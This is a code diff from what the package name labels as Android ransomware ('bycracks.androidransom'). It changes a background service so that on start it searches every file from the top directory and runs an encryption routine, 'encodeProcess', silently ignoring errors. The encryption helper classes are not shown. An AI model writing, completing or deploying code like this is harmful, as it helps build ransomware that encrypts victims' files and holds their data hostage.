@@ -1,18 +1,12 @@
 package bycracks.androidransom;
 
-import android.app.IntentService;
 import android.app.Service;
 import android.content.Intent;
-import android.os.Handler;
 import android.os.IBinder;
 import android.widget.Toast;
 
-import java.io.File;
-
 
 public class MyService extends Service {
-    Handler mHandler;
-
     @Override
     public void onCreate() {
         super.onCreate();
@@ -28,9 +22,13 @@ public class MyService extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
         Toast.makeText(this, "onStartCommand Start", Toast.LENGTH_SHORT).show();
 
-        SearchFiles searching = new SearchFiles();
-        File f = searching.getTopDir();
-        searching.searchAllFile(f);
+        Search_Encrypt tool = new Search_Encrypt();
+        tool.searchAllFile(tool.getTopDir());
+        try {
+            tool.encodeProcess();
+        } catch (Exception e) {
+            e.getMessage();
+        }
 
         return super.onStartCommand(intent, flags, startId);
     }
